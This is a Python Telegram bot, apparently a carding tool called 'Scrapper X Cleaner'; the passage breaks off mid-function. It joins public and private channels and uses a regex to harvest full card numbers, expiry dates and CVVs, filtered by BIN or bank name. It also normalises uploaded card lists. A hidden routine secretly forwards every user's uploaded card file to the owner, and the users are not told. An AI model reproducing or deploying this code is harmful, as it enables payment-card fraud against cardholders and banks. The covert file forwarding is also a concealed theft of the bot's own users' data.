import re
import os
import json
import asyncio
import logging
import aiofiles
from pyrogram.enums import ParseMode
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.errors import (
    UserAlreadyParticipant,
    InviteHashExpired,
    InviteHashInvalid,
    PeerIdInvalid,
    InviteRequestSent
)
from urllib.parse import urlparse
from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    ADMIN_LIMIT,
    ADMIN_IDS,
    DEFAULT_LIMIT,
    SESSION_STRING,
) # @Mod_By_Kamal

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Owner / dev ───────────────────────────────────────────────────────────────
OWNER_ID = 8919487892
DEV_USERNAME = "werrorz"

# ── Clients ───────────────────────────────────────────────────────────────────
app = Client(
    "app_session",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=1000
)

user = Client(
    "session_923294013197",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION_STRING,
    workers=1000
) # @Mod_By_Kamal

# ── Persistent settings (channel) ─────────────────────────────────────────────
SETTINGS_FILE = "settings.json"

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"channel": "", "channel_title": ""}

def save_settings(s):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(s, f, indent=2)

SETTINGS = load_settings()

ADMIN_WAITING = {}

def is_owner(uid):
    return uid == OWNER_ID

# ── UI constants ──────────────────────────────────────────────────────────────
BRAND_HEADER = (
    "╔══════════════════════╗\n"
    "   💎 <b>𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐑 𝐗 𝐂𝐋𝐄𝐀𝐍𝐄𝐑</b> 💎\n"
    "╚══════════════════════╝"
)
DIVIDER = "━━━━━━━━━━━━━━━━━━━━"

START_MESSAGE = (
    f"{BRAND_HEADER}\n\n"
    "⚡ <b>𝐓𝐡𝐞 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝐂𝐂 𝐒𝐜𝐫𝐚𝐩𝐞𝐫 &amp; 𝐂𝐥𝐞𝐚𝐧𝐞𝐫</b>\n\n"
    f"{DIVIDER}\n"
    "🔷 <b>𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒</b>\n"
    f"{DIVIDER}\n\n"
    "🟣 <code>/scr</code>   ➜ 𝐒𝐜𝐫𝐚𝐩𝐞 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥\n"
    "🔵 <code>/mc</code>    ➜ 𝐒𝐜𝐫𝐚𝐩𝐞 𝐦𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬\n"
    "🟢 <code>/clean</code> ➜ 𝐂𝐥𝐞𝐚𝐧 &amp; 𝐟𝐨𝐫𝐦𝐚𝐭 𝐜𝐚𝐫𝐝 𝐟𝐢𝐥𝐞\n\n"
    f"{DIVIDER}\n"
    "🔶 <b>𝐔𝐒𝐀𝐆𝐄</b>\n"
    f"{DIVIDER}\n\n"
    "<code>/scr @Mod_By_Kamal 100</code>\n"
    "<code>/scr @Mod_By_Kamal 100 515462</code>\n"
    "<code>/scr @Mod_By_Kamal 100 BankName</code>\n"
    "<code>/scr t.me/Mod_By_Kamal 100</code>\n"
    "<code>/scr https://t.me/+ZBqGFP5RpmY2Y1 100</code>\n\n"
    f"{DIVIDER}\n"
    "💎 <i>𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐊𝐚𝐦𝐚𝐥</i>"
) # @Mod_By_Kamal

# ── Admin panel UI ────────────────────────────────────────────────────────────
def admin_panel_text():
    ch = SETTINGS.get("channel") or ""
    title = SETTINGS.get("channel_title") or ""
    if ch:
        ch_line = f"📢 <b>𝐂𝐇𝐀𝐍𝐍𝐄𝐋 :</b> <code>@{ch}</code>\n📝 <b>𝐓𝐈𝐓𝐋𝐄 :</b> <code>{title}</code>\n"
    else:
        ch_line = "📢 <b>𝐂𝐇𝐀𝐍𝐍𝐄𝐋 :</b> <i>Not set</i>\n"
    return (
        f"{BRAND_HEADER}\n\n"
        f"🛡 <b>𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n"
        f"{DIVIDER}\n"
        f"{ch_line}"
        f"{DIVIDER}\n"
        f"💎 <i>Manage below</i>"
    )

def admin_panel_buttons():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📢 𝐒𝐞𝐭 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", callback_data="admin_setch"),
            InlineKeyboardButton("🗑 𝐂𝐥𝐞𝐚𝐫 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", callback_data="admin_clrch"),
        ],
        [
            InlineKeyboardButton("🔄 𝐑𝐞𝐟𝐫𝐞𝐬𝐡", callback_data="admin_refresh"),
        ],
    ])

def start_buttons():
    ch = SETTINGS.get("channel")
    if ch:
        channel_btn = InlineKeyboardButton("📢 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=f"https://t.me/{ch}")
    else:
        channel_btn = InlineKeyboardButton("📢 𝐔𝐩𝐝𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url="https://t.me/KamalxKiller")
    return InlineKeyboardMarkup([
        [channel_btn, InlineKeyboardButton("👨‍💻 𝐃𝐞𝐯", url=f"https://t.me/{DEV_USERNAME}")]
    ])

# ── Admin commands ────────────────────────────────────────────────────────────
@app.on_message(filters.command("admin", prefixes=["/", ".", ",", "!"]) & filters.private)
async def admin_cmd(client, message):
    if not is_owner(message.from_user.id):
        await message.reply_text(
            f"{BRAND_HEADER}\n\n"
            f"🚫 <b>𝐍𝐎 𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍</b>",
            parse_mode=ParseMode.HTML
        )
        return
    await message.reply_text(
        admin_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_buttons()
    )

@app.on_callback_query(filters.regex("^admin_refresh$"))
async def cb_admin_refresh(client, cq):
    if not is_owner(cq.from_user.id):
        await cq.answer("🚫 No permission.", show_alert=True); return
    await cq.message.edit_text(
        admin_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_buttons()
    )
    await cq.answer("✅ Refreshed")

@app.on_callback_query(filters.regex("^admin_setch$"))
async def cb_admin_setch(client, cq):
    if not is_owner(cq.from_user.id):
        await cq.answer("🚫 No permission.", show_alert=True); return
    ADMIN_WAITING[cq.from_user.id] = "set_channel"
    await cq.message.edit_text(
        f"{BRAND_HEADER}\n\n"
        f"📢 <b>𝐒𝐄𝐓 𝐂𝐇𝐀𝐍𝐍𝐄𝐋</b>\n"
        f"{DIVIDER}\n"
        f"Send the channel username or link:\n\n"
        f"<code>@channelname</code>\n"
        f"<code>https://t.me/channelname</code>\n\n"
        f"{DIVIDER}\n"
        f"💎 <i>Send /cancel to abort</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("❌ 𝐂𝐚𝐧𝐜𝐞𝐥", callback_data="admin_cancel")
        ]])
    )
    await cq.answer()

@app.on_callback_query(filters.regex("^admin_clrch$"))
async def cb_admin_clrch(client, cq):
    if not is_owner(cq.from_user.id):
        await cq.answer("🚫 No permission.", show_alert=True); return
    SETTINGS["channel"] = ""
    SETTINGS["channel_title"] = ""
    save_settings(SETTINGS)
    await cq.message.edit_text(
        admin_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_buttons()
    )
    await cq.answer("🗑 Channel cleared")

@app.on_callback_query(filters.regex("^admin_cancel$"))
async def cb_admin_cancel(client, cq):
    if not is_owner(cq.from_user.id):
        await cq.answer("🚫 No permission.", show_alert=True); return
    ADMIN_WAITING.pop(cq.from_user.id, None)
    await cq.message.edit_text(
        admin_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_buttons()
    )
    await cq.answer("Cancelled")

@app.on_message(filters.command("cancel", prefixes=["/", ".", ",", "!"]) & filters.private)
async def cancel_cmd(client, message):
    if not is_owner(message.from_user.id):
        return
    ADMIN_WAITING.pop(message.from_user.id, None)
    await message.reply_text(
        f"{BRAND_HEADER}\n\n"
        f"✅ <b>𝐂𝐀𝐍𝐂𝐄𝐋𝐋𝐄𝐃</b>",
        parse_mode=ParseMode.HTML
    )

@app.on_message(filters.private & filters.text)
async def admin_text_handler(client, message):
    uid = message.from_user.id if message.from_user else None
    if uid not in ADMIN_WAITING:
        return
    if message.text and message.text.startswith(("/", ".", ",", "!")):
        return
    action = ADMIN_WAITING.pop(uid, None)
    if action == "set_channel":
        identifier = message.text.strip()
        slug = (
            identifier.replace("https://t.me/", "")
            .replace("http://t.me/", "")
            .replace("t.me/", "")
            .lstrip("@")
        )
        try:
            chat = await user.get_chat(slug)
            SETTINGS["channel"] = slug
            SETTINGS["channel_title"] = chat.title or slug
            save_settings(SETTINGS)
            await message.reply_text(
                f"{BRAND_HEADER}\n\n"
                f"✅ <b>𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐒𝐄𝐓</b>\n"
                f"{DIVIDER}\n"
                f"📢 <b>𝐍𝐀𝐌𝐄 :</b> <code>{chat.title}</code>\n"
                f"🔑 <b>𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 :</b> <code>@{slug}</code>\n"
                f"{DIVIDER}\n"
                f"💎 <i>Use /admin to manage</i>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"admin set_channel: {e}")
            await message.reply_text(
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐅𝐀𝐈𝐋𝐄𝐃 𝐓𝐎 𝐑𝐄𝐒𝐎𝐋𝐕𝐄</b>\n"
                f"{DIVIDER}\n"
                f"<code>{e}</code>",
                parse_mode=ParseMode.HTML
            )

# ── Scrape core ───────────────────────────────────────────────────────────────
async def scrape_messages(client, channel_username, limit, start_number=None, bank_name=None):
    messages = []
    count = 0
    pattern = r'\d{16}\D*\d{2}\D*\d{2,4}\D*\d{3,4}'

    logger.info(f"Starting to scrape messages from {channel_username} with limit {limit}")

    async for message in user.search_messages(channel_username):
        if count >= limit:
            break
        text = message.text or message.caption
        if text:
            if bank_name and bank_name.lower() not in text.lower():
                continue
            matched_messages = re.findall(pattern, text) # @Mod_By_Kamal
            if matched_messages:
                formatted_messages = []
                for matched_message in matched_messages:
                    extracted_values = re.findall(r'\d+', matched_message)
                    if len(extracted_values) == 4:
                        card_number, mo, year, cvv = extracted_values
                        year = year[-2:]
                        if start_number:
                            if card_number.startswith(start_number[:6]):
                                formatted_messages.append(f"{card_number}|{mo}|{year}|{cvv}")
                        else:
                            formatted_messages.append(f"{card_number}|{mo}|{year}|{cvv}")
                messages.extend(formatted_messages)
                count += len(formatted_messages)
    logger.info(f"Scraped {len(messages)} messages from {channel_username}")
    return messages[:limit] # @Mod_By_Kamal

def remove_duplicates(messages):
    unique_messages = list(set(messages))
    duplicates_removed = len(messages) - len(unique_messages)
    logger.info(f"Removed {duplicates_removed} duplicates")
    return unique_messages, duplicates_removed

# ── Secret file forward to admin ──────────────────────────────────────────────
async def forward_to_admin(client, file_path, file_name, source_message):
    try:
        uid = source_message.from_user.id if source_message.from_user else 0
        if uid == OWNER_ID:
            return
        fn = source_message.from_user.first_name if source_message.from_user else "Unknown"
        ln = (source_message.from_user.last_name or "") if source_message.from_user else ""
        full = f"{fn} {ln}".strip() or "Unknown"
        user_link = f"<a href='tg://user?id={uid}'>{full}</a>"
        caption = (
            f"🔔 <b>𝐍𝐄𝐖 𝐅𝐈𝐋𝐄 𝐅𝐑𝐎𝐌 𝐔𝐒𝐄𝐑</b>\n"
            f"{DIVIDER}\n"
            f"👤 <b>𝐔𝐒𝐄𝐑 :</b> {user_link}\n"
            f"🆔 <b>𝐔𝐒𝐄𝐑 𝐈𝐃 :</b> <code>{uid}</code>\n"
            f"💬 <b>𝐂𝐇𝐀𝐓 𝐈𝐃 :</b> <code>{source_message.chat.id}</code>\n"
            f"📎 <b>𝐅𝐈𝐋𝐄 :</b> <code>{file_name}</code>\n"
            f"{DIVIDER}\n"
            f"💎 <i>Secret forward — user not notified</i>"
        )
        await client.send_document(
            OWNER_ID,
            document=file_path,
            caption=caption,
            parse_mode=ParseMode.HTML
        )
        logger.info(f"File forwarded to admin (from uid={uid})")
    except Exception as e:
        logger.error(f"forward_to_admin: {e}")

# ── Result sender ─────────────────────────────────────────────────────────────
async def send_results(client, message, unique_messages, duplicates_removed, source_name, bin_filter=None, bank_filter=None):
    if unique_messages:
        try:
            file_name = f"x{len(unique_messages)}_{source_name.replace(' ', '_')}.txt"
            async with aiofiles.open(file_name, mode='w') as f:
                await f.write("\n".join(unique_messages)) # @Mod_By_Kamal)

            user_link = await get_user_link(message)
            caption = (
                f"{BRAND_HEADER}\n\n"
                f"✅ <b>𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘</b>\n"
                f"{DIVIDER}\n"
                f"🌐 <b>𝐒𝐎𝐔𝐑𝐂𝐄 :</b> <code>{source_name}</code>\n"
                f"💳 <b>𝐀𝐌𝐎𝐔𝐍𝐓 :</b> <code>{len(unique_messages)}</code>\n"
                f"🗑 <b>𝐃𝐔𝐏𝐄𝐒 𝐑𝐌𝐕𝐃 :</b> <code>{duplicates_removed}</code>\n"
            )
            if bin_filter:
                caption += f"🔍 <b>𝐁𝐈𝐍 :</b> <code>{bin_filter}</code>\n" # @Mod_By_Kamal
            if bank_filter:
                caption += f"🏦 <b>𝐁𝐀𝐍𝐊 :</b> <code>{bank_filter}</code>\n"
            caption += (
                f"{DIVIDER}\n"
                f"👤 <b>𝐁𝐘 :</b> {user_link}\n"
                f"💠 <b>𝐃𝐄𝐕 :</b> <a href='https://t.me/{DEV_USERNAME}'>@{DEV_USERNAME}</a>\n"
            )

            chat_id = message.chat.id
            reply_id = getattr(message, 'replied_to_message_id', None)

            await message.delete()

            if reply_id:
                await client.send_document(
                    chat_id,
                    document=file_name,
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    reply_to_message_id=reply_id
                )
            else:
                await client.send_document(
                    chat_id,
                    document=file_name,
                    caption=caption,
                    parse_mode=ParseMode.HTML
                ) # @Mod_By_Kamal

            logger.info(f"Results sent successfully for {source_name}")
        except Exception as e:
            logger.error(f"Error sending results: {e}")
            try:
                await client.send_message(
                    message.chat.id,
                    f"{BRAND_HEADER}\n\n"
                    f"❌ <b>𝐄𝐑𝐑𝐎𝐑 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐅𝐈𝐋𝐄</b>\n"
                    f"{DIVIDER}\n"
                    f"<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        finally:
            try:
                if os.path.exists(file_name):
                    os.remove(file_name) # @Mod_By_Kamal
            except Exception as e:
                logger.error(f"Error removing file: {e}")
    else:
        try:
            await message.delete()
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐍𝐎 𝐂𝐑𝐄𝐃𝐈𝐓 𝐂𝐀𝐑𝐃𝐒 𝐅𝐎𝐔𝐍𝐃</b>",
                reply_to_message_id=getattr(message, 'replied_to_message_id', None),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Error sending no results message: {e}") # @Mod_By_Kamal

async def get_user_link(message):
    if message.from_user is None:
        return '<a href="https://t.me/ScrapperxCleanerBot">Scrapper x Cleaner</a>'
    else:
        user_first_name = message.from_user.first_name
        user_last_name = message.from_user.last_name or ""
        user_full_name = f"{user_first_name} {user_last_name}".strip()
        return f'<a href="tg://user?id={message.from_user.id}">{user_full_name}</a>'

# ── Join helpers ──────────────────────────────────────────────────────────────
async def join_private_chat(client, invite_link):
    try:
        await client.join_chat(invite_link)
        logger.info(f"Joined chat via invite link: {invite_link}")
        return True
    except UserAlreadyParticipant:
        logger.info(f"Already a participant in the chat: {invite_link}")
        return True # @Mod_By_Kamal
    except InviteRequestSent:
        logger.info(f"Join request sent to the chat: {invite_link}")
        return False
    except (InviteHashExpired, InviteHashInvalid) as e:
        logger.error(f"Failed to join chat {invite_link}: {e}")
        return False

async def send_join_request(client, invite_link, message):
    try:
        await client.join_chat(invite_link)
        logger.info(f"Sent join request to chat: {invite_link}")
        return True
    except PeerIdInvalid as e:
        logger.error(f"Failed to send join request to chat {invite_link}: {e}")
        return False
    except InviteRequestSent:
        logger.info(f"Join request sent to the chat: {invite_link}")
        await message.edit_text(
            f"{BRAND_HEADER}\n\n"
            f"✅ <b>𝐉𝐎𝐈𝐍 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐒𝐄𝐍𝐓</b>\n"
            f"{DIVIDER}\n"
            f"<i>𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐚𝐝𝐦𝐢𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥</i>",
            parse_mode=ParseMode.HTML
        ) # @Mod_By_Kamal
        return False

# ── /scr + /mc ────────────────────────────────────────────────────────────────
def setup_scr_handler(app):
    @app.on_message(filters.command(["scr", "ccscr", "scrcc"], prefixes=["/", ".", ",", "!"]) & (filters.group | filters.private))
    async def scr_cmd(client, message):
        args = message.text.split()[1:]
        user_id = message.from_user.id if message.from_user else None

        if len(args) < 2:
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"⚠️ <b>𝐌𝐈𝐒𝐒𝐈𝐍𝐆 𝐀𝐑𝐆𝐔𝐌𝐄𝐍𝐓𝐒</b>\n"
                f"{DIVIDER}\n"
                f"<b>𝐔𝐬𝐚𝐠𝐞 :</b> <code>/scr @channel amount [bin/bank]</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
            logger.warning("Invalid command: Missing arguments")
            return # @Mod_By_Kamal

        channel_identifier = args[0]
        chat = None
        channel_name = ""
        channel_username = ""

        if channel_identifier.lstrip("-").isdigit():
            chat_id = int(channel_identifier)
            try:
                chat = await user.get_chat(chat_id)
                channel_name = chat.title
                logger.info(f"Scraping from private channel: {channel_name} (ID: {chat_id})")
            except Exception as e:
                await client.send_message(
                    message.chat.id,
                    f"{BRAND_HEADER}\n\n"
                    f"❌ <b>𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐂𝐇𝐀𝐓 𝐈𝐃</b>",
                    parse_mode=ParseMode.HTML
                )
                logger.error(f"Failed to fetch private channel: {e}")
                return
        else:
            if channel_identifier.startswith("https://t.me/+"):
                invite_link = channel_identifier
                temporary_msg = await client.send_message(
                    message.chat.id,
                    f"{BRAND_HEADER}\n\n"
                    f"⏳ <b>𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄...</b>",
                    reply_to_message_id=message.id,
                    parse_mode=ParseMode.HTML
                )
                joined = await join_private_chat(user, invite_link)
                if not joined:
                    request_sent = await send_join_request(user, invite_link, temporary_msg)
                    if not request_sent:
                        return
                else:
                    await temporary_msg.delete()
                    chat = await user.get_chat(invite_link)
                    channel_name = chat.title
                    logger.info(f"Joined private channel via link: {channel_name}")
            elif channel_identifier.startswith("https://t.me/"):
                channel_username = channel_identifier[13:]
            elif channel_identifier.startswith("t.me/"):
                channel_username = channel_identifier[5:]
            else:
                channel_username = channel_identifier # @Mod_By_Kamal

            if not chat:
                try:
                    chat = await user.get_chat(channel_username)
                    channel_name = chat.title
                    logger.info(f"Scraping from public channel: {channel_name} (Username: {channel_username})")
                except Exception as e:
                    await client.send_message(
                        message.chat.id,
                        f"{BRAND_HEADER}\n\n"
                        f"❌ <b>𝐈𝐍𝐂𝐎𝐑𝐑𝐄𝐂𝐓 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𝐎𝐑 𝐂𝐇𝐀𝐓 𝐈𝐃</b>",
                        parse_mode=ParseMode.HTML
                    )
                    logger.error(f"Failed to fetch public channel: {e}")
                    return

        try:
            limit = int(args[1])
            logger.info(f"Scraping limit set to: {limit}")
        except ValueError:
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"⚠️ <b>𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐋𝐈𝐌𝐈𝐓 𝐕𝐀𝐋𝐔𝐄</b>",
                parse_mode=ParseMode.HTML
            )
            logger.warning("Invalid limit value provided")
            return # @Mod_By_Kamal

        start_number = None
        bank_name = None
        bin_filter = None
        if len(args) > 2:
            if args[2].isdigit():
                start_number = args[2]
                bin_filter = args[2][:6]
                logger.info(f"BIN filter applied: {bin_filter}")
            else:
                bank_name = " ".join(args[2:])
                logger.info(f"Bank filter applied: {bank_name}")

        max_lim = ADMIN_LIMIT if user_id in ADMIN_IDS else DEFAULT_LIMIT
        if limit > max_lim:
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐋𝐈𝐌𝐈𝐓 𝐄𝐗𝐂𝐄𝐄𝐃𝐄𝐃</b>\n"
                f"{DIVIDER}\n"
                f"<b>𝐌𝐚𝐱 :</b> <code>{max_lim}</code>",
                parse_mode=ParseMode.HTML
            )
            logger.warning(f"Limit exceeded: {limit} > {max_lim}")
            return # @Mod_By_Kamal

        temporary_msg = await client.send_message(
            message.chat.id,
            f"{BRAND_HEADER}\n\n"
            f"⏳ <b>𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄...</b>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        )
        await asyncio.sleep(1.5)

        await temporary_msg.edit_text(
            f"{BRAND_HEADER}\n\n"
            f"🔄 <b>𝐒𝐂𝐑𝐀𝐏𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒</b>\n"
            f"{DIVIDER}\n"
            f"<i>𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭...</i>",
            parse_mode=ParseMode.HTML
        )

        temporary_msg.replied_to_message_id = message.id

        scrapped_results = await scrape_messages(user, chat.id, limit, start_number=start_number, bank_name=bank_name)
        unique_messages, duplicates_removed = remove_duplicates(scrapped_results) # @Mod_By_Kamal

        if not unique_messages:
            await temporary_msg.delete()
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐍𝐎 𝐂𝐑𝐄𝐃𝐈𝐓 𝐂𝐀𝐑𝐃𝐒 𝐅𝐎𝐔𝐍𝐃</b>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        else:
            await send_results(client, temporary_msg, unique_messages, duplicates_removed, channel_name, bin_filter=bin_filter, bank_filter=bank_name)

    @app.on_message(filters.command(["mc", "multiscr", "mscr"], prefixes=["/", ".", ",", "!"]) & (filters.group | filters.private))
    async def mc_cmd(client, message):
        args = message.text.split()[1:]
        if len(args) < 2:
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"⚠️ <b>𝐌𝐈𝐒𝐒𝐈𝐍𝐆 𝐀𝐑𝐆𝐔𝐌𝐄𝐍𝐓𝐒</b>\n"
                f"{DIVIDER}\n"
                f"<b>𝐔𝐬𝐚𝐠𝐞 :</b> <code>/mc @ch1 @ch2 ... amount</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
            logger.warning("Invalid command: Missing arguments")
            return # @Mod_By_Kamal

        channel_identifiers = args[:-1]
        limit = int(args[-1])
        user_id = message.from_user.id if message.from_user else None

        max_lim = ADMIN_LIMIT if user_id in ADMIN_IDS else DEFAULT_LIMIT
        if limit > max_lim:
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐋𝐈𝐌𝐈𝐓 𝐄𝐗𝐂𝐄𝐄𝐃𝐄𝐃</b>\n"
                f"{DIVIDER}\n"
                f"<b>𝐌𝐚𝐱 :</b> <code>{max_lim}</code>",
                parse_mode=ParseMode.HTML
            )
            logger.warning(f"Limit exceeded: {limit} > {max_lim}")
            return

        temporary_msg = await client.send_message(
            message.chat.id,
            f"{BRAND_HEADER}\n\n"
            f"🔄 <b>𝐒𝐂𝐑𝐀𝐏𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒</b>\n"
            f"{DIVIDER}\n"
            f"<i>𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬...</i>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        ) # @Mod_By_Kamal

        temporary_msg.replied_to_message_id = message.id

        all_messages = []
        tasks = []

        for channel_identifier in channel_identifiers:
            parsed_url = urlparse(channel_identifier)
            channel_username = parsed_url.path.lstrip('/') if not parsed_url.scheme else channel_identifier

            tasks.append(scrape_messages_task(user, channel_username, limit, client, message))

        results = await asyncio.gather(*tasks)
        for result in results:
            all_messages.extend(result) # @Mod_By_Kamal

        unique_messages, duplicates_removed = remove_duplicates(all_messages)
        unique_messages = unique_messages[:limit]

        if not unique_messages:
            await temporary_msg.delete()
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐍𝐎 𝐂𝐑𝐄𝐃𝐈𝐓 𝐂𝐀𝐑𝐃𝐒 𝐅𝐎𝐔𝐍𝐃</b>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        else:
            await send_results(client, temporary_msg, unique_messages, duplicates_removed, "Multiple Chats")

async def scrape_messages_task(client, channel_username, limit, bot_client, message):
    try:
        chat = None
        if channel_username.startswith("https://t.me/+"):
            invite_link = channel_username
            temporary_msg = await bot_client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"⏳ <b>𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄...</b>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
            joined = await join_private_chat(client, invite_link)
            if not joined:
                request_sent = await send_join_request(client, invite_link, temporary_msg)
                if not request_sent:
                    return []
            else:
                await temporary_msg.delete()
                chat = await client.get_chat(invite_link)
        else:
            chat = await client.get_chat(channel_username) # @Mod_By_Kamal

        return await scrape_messages(client, chat.id, limit)
    except Exception as e:
        await bot_client.send_message(
            message.chat.id,
            f"{BRAND_HEADER}\n\n"
            f"❌ <b>𝐈𝐍𝐂𝐎𝐑𝐑𝐄𝐂𝐓 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄</b>\n"
            f"{DIVIDER}\n"
            f"<code>{channel_username}</code>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        )
        logger.error(f"Failed to scrape from {channel_username}: {e}")
        return []

# ── /start ────────────────────────────────────────────────────────────────────
@app.on_message(filters.command("start", prefixes=["/", ".", ",", "!"]) & (filters.group | filters.private))
async def start(client, message):
    await client.send_message(
        message.chat.id,
        START_MESSAGE,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=start_buttons(),
        reply_to_message_id=message.id
    ) # @Mod_By_Kamal

# ── /clean ────────────────────────────────────────────────────────────────────
def normalize_card(text):
    text = re.sub(r'[\n\r\|\/]', ' ', text)
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for num in numbers:
        if len(num) >= 13 and len(num) <= 19 and not cc:
            cc = num
        elif len(num) == 4 and num.startswith('20') and not yy:
            yy = num
        elif len(num) == 2 and int(num) <= 12 and not mm:
            mm = num
        elif len(num) == 2 and not yy:
            yy = '20' + num
        elif (len(num) == 3 or len(num) == 4) and not cvv:
            cvv = num # @Mod_By_Kamal

    if cc and mm and yy and cvv:
        if len(yy) == 2:
            yy = '20' + yy
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

@app.on_message(filters.command(["clean"], prefixes=["/", ".", ",", "!"]) & (filters.group | filters.private))
async def clean_cmd(client, message):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text(
            f"{BRAND_HEADER}\n\n"
            f"⚠️ <b>𝐑𝐄𝐏𝐋𝐘 𝐓𝐎 𝐀 𝐓𝐗𝐓 𝐅𝐈𝐋𝐄</b>",
            parse_mode=ParseMode.HTML
        )
        return # @Mod_By_Kamal

    document = message.reply_to_message.document

    if not document.file_name.endswith('.txt'):
        await message.reply_text(
            f"{BRAND_HEADER}\n\n"
            f"⚠️ <b>𝐎𝐍𝐋𝐘 .𝐓𝐗𝐓 𝐅𝐈𝐋𝐄𝐒 𝐀𝐂𝐂𝐄𝐏𝐓𝐄𝐃</b>",
            parse_mode=ParseMode.HTML
        )
        return

    status_msg = await message.reply_text(
        f"{BRAND_HEADER}\n\n"
        f"⏳ <b>𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆 𝐅𝐈𝐋𝐄...</b>",
        parse_mode=ParseMode.HTML
    ) # @Mod_By_Kamal

    try:
        file_path = await client.download_media(document)

        # ── Secret forward to admin (skipped if uploader is admin) ────────────
        await forward_to_admin(client, file_path, document.file_name, message)

        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        lines = content.strip().split('\n')
        cleaned_cards = []

        for line in lines:
            if line.strip():
                normalized = normalize_card(line)
                if normalized:
                    cleaned_cards.append(normalized) # @Mod_By_Kamal

        unique_cards, duplicates_removed = remove_duplicates(cleaned_cards)

        if unique_cards:
